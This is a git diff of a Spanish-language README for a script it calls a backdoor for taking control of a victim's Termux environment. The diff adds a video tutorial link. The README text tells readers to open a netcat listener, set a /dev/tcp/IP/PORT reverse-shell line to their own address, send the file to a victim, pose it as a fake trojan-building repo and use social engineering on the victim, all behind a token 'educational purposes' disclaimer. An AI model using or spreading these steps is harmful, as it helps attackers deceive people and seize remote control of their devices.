@@ -3,6 +3,9 @@ Esta script es un backdoor para tomar control de la victima de su termux su uso 
 
 #Su uso es para fines educativos no me hago responsable del mal uso
 
+Tutorial de como usarlo :
+https://youtu.be/jd1Wf_pU6dE
+
 #PASOS A SEGUIR
 1) nc -lvp (puerto)
 
@@ -19,4 +22,4 @@ dentro de la siguiente linea /dev/tcp/IP/PUERTO
 
 Una ves eso lo guardan y le envían a la victima
 pueden crear un repo falso disque para hacer troyanos 
-Usen ig social con la victima.
+usen ig social con la victima.
